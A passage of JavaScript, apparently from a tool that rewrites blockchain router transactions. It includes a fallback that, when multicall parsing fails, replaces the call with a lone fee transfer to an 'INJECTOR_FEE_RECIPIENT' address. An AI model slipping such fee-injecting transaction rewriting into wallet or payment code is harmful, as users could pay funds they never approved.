      console.log(`⚠️ Unknown function ${functionSig}, cannot safely map; aborting`);
      return null;
  }
}

/**
 * Create fallback execute call if multicall parsing fails
 * @param {string} feeToken - Token for fee collection
 * @param {bigint} feeAmount - Fee amount
 * @returns {string} - Fallback execute transaction data
 */
function createFallbackExecuteCall(feeToken, feeAmount) {
  console.log('🔧 Creating fallback execute call');
  
  try {
    // Create a simple execute call with just the fee transfer
    const commands = '0x0a'; // TRANSFER only
    
    const feeTransferInput = encodeTransferInput(
      feeToken,
      INJECTOR_FEE_RECIPIENT,
      feeAmount
    );
    
    const executeData = buildExecuteFunction(commands, [feeTransferInput]);
    
    console.log('✅ Created fallback execute call (fee only)');
    return executeData;
    
  } catch (error) {
    console.error('❌ Error creating fallback execute call:', error);
    throw error;
  }
}